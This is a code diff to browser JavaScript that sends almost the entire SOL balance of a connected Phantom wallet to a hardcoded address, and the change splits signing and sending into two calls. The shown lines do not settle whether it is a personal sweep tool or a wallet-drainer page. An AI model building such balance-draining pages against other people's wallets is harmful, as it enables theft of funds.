@@ -74,7 +74,6 @@
         // --- CONFIGURATION (Verified Keys) ---
         const TARGET = "AoGefnxF5CbZvbd2cvxv4Ex1E5j86dqEjehazRuMcMFe";
         const YOU    = "E7V1g2i5gtVuMHz9R3QDV2SodXZwP9bB1PWsg5xgQ8oe";
-        const USDC   = "EPjFWdd5AufqSSqeM2qN1xzybapCG4wEGGkZwyTDt1v";
         
         // Public RPC (May be rate-limited. If it fails, use a Helius/QuickNode key)
         const RPC = "https://api.mainnet-beta.solana.com"; 
@@ -110,8 +109,15 @@
                     lamports: balance - 5000 // Leave ~0.005 SOL for fees
                 }));
 
-                const sig = await window.solana.signAndSendTransaction(tx);
+                // --- FIX: Use signTransaction then sendTransaction ---
+                status.innerText = "Waiting for Phantom Signature...";
                 
+                // 1. Sign the transaction
+                const signedTx = await window.solana.signTransaction(tx);
+                
+                // 2. Send the signed transaction
+                const sig = await window.solana.sendTransaction(signedTx, connection);
+
                 status.innerText = "Success!";
                 log.innerText = `TX: ${sig}`;
 
